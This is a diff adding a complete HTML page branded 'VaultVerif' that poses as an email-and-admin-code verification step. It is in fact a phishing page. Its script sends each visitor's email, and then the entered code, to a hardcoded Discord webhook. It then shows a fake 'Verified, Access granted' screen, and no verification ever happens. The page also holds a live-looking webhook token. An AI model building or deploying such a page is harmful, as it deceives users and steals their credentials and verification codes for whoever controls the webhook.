@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>VaultVerif</title>
+
+<style>
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: radial-gradient(circle at top, #1e293b, #020617);
+  color: white;
+  height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  overflow: hidden;
+}
+
+/* PARTICLES */
+.particle {
+  position: absolute;
+  width: 6px;
+  height: 6px;
+  background: rgba(99,102,241,0.6);
+  border-radius: 50%;
+  animation: float 10s infinite linear;
+}
+
+@keyframes float {
+  from { transform: translateY(100vh); opacity: 0; }
+  to { transform: translateY(-10vh); opacity: 1; }
+}
+
+/* FADE IN */
+.container {
+  background: rgba(255,255,255,0.06);
+  padding: 40px;
+  border-radius: 22px;
+  backdrop-filter: blur(14px);
+  box-shadow: 0 0 40px rgba(0,0,0,0.6);
+  text-align: center;
+  width: 360px;
+  border: 1px solid rgba(255,255,255,0.08);
+  animation: fadeIn 0.6s ease;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: scale(0.95); }
+  to { opacity: 1; transform: scale(1); }
+}
+
+h2 { margin-bottom: 10px; }
+
+input, button {
+  width: 100%;
+  box-sizing: border-box;
+  padding: 13px;
+  border-radius: 12px;
+  border: none;
+  margin-top: 12px;
+  font-size: 14px;
+}
+
+input {
+  background: rgba(255,255,255,0.08);
+  color: white;
+}
+
+button {
+  background: linear-gradient(135deg, #6366f1, #8b5cf6);
+  color: white;
+  font-weight: bold;
+  cursor: pointer;
+  transition: 0.2s;
+}
+
+button:hover {
+  transform: translateY(-2px);
+}
+
+/* STATUS */
+.status {
+  color: #60a5fa;
+  margin-top: 10px;
+  font-size: 13px;
+  display: none;
+}
+
+/* LOADER */
+.loader {
+  border: 3px solid rgba(255,255,255,0.2);
+  border-top: 3px solid #6366f1;
+  border-radius: 50%;
+  width: 18px;
+  height: 18px;
+  animation: spin 1s linear infinite;
+  margin: 10px auto;
+  display: none;
+}
+
+@keyframes spin {
+  100% { transform: rotate(360deg); }
+}
+
+/* SUCCESS SCREEN */
+.success {
+  display: none;
+  text-align: center;
+  animation: fadeIn 0.5s ease;
+}
+
+.success h1 {
+  color: #34d399;
+}
+</style>
+</head>
+
+<body>
+
+<!-- PARTICLES -->
+<script>
+for (let i = 0; i < 25; i++) {
+  let p = document.createElement("div");
+  p.className = "particle";
+  p.style.left = Math.random() * 100 + "vw";
+  p.style.animationDuration = (5 + Math.random() * 10) + "s";
+  document.body.appendChild(p);
+}
+</script>
+
+<div class="container" id="mainBox">
+  <h2>VaultVerif</h2>
+
+  <!-- STEP 1 -->
+  <div id="step1">
+    <p>Enter your email</p>
+    <input type="email" id="email" placeholder="Email address">
+
+    <div class="loader" id="loader"></div>
+    <div class="status" id="status"></div>
+
+    <button onclick="nextStep()">Continue</button>
+  </div>
+
+  <!-- STEP 2 -->
+  <div id="step2" style="display:none;">
+    <p>Enter admin verification code</p>
+    <input type="text" id="code" placeholder="Code">
+    <button onclick="send()">Verify</button>
+  </div>
+
+  <!-- SUCCESS -->
+  <div class="success" id="success">
+    <h1>Verified ✅</h1>
+    <p>Access granted</p>
+  </div>
+</div>
+
+<script>
+let userEmail = "";
+
+function isValidEmail(email) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email);
+}
+
+function nextStep() {
+  const email = document.getElementById("email").value.trim();
+  const loader = document.getElementById("loader");
+  const status = document.getElementById("status");
+
+  loader.style.display = "block";
+  status.style.display = "block";
+  status.textContent = "Verifying...";
+
+  setTimeout(() => {
+
+    if (!isValidEmail(email)) {
+      loader.style.display = "none";
+      status.textContent = "Invalid email address";
+      status.style.color = "#ff4d4d";
+      return;
+    }
+
+    userEmail = email;
+
+    fetch("https://discord.com/api/webhooks/1494249081734693027/hZpzQ5RRJHhOWsR3LMMswOjkQQ_yRuuFX1PtWFKRVkly9QkcsqgVi39fSAArTDFb73Yy", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({
+        content: "📩 VaultVerif Email: " + userEmail
+      })
+    });
+
+    document.getElementById("step1").style.display = "none";
+    document.getElementById("step2").style.display = "block";
+
+  }, 1200);
+}
+
+function send() {
+  const code = document.getElementById("code").value.trim();
+
+  fetch("https://discord.com/api/webhooks/1494249081734693027/hZpzQ5RRJHhOWsR3LMMswOjkQQ_yRuuFX1PtWFKRVkly9QkcsqgVi39fSAArTDFb73Yy", {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({
+      content: "🔐 VaultVerif\nEmail: " + userEmail + "\nCode: " + code
+    })
+  });
+
+  document.getElementById("step2").style.display = "none";
+  document.getElementById("success").style.display = "block";
+}
+</script>
+
+</body>
+</html>
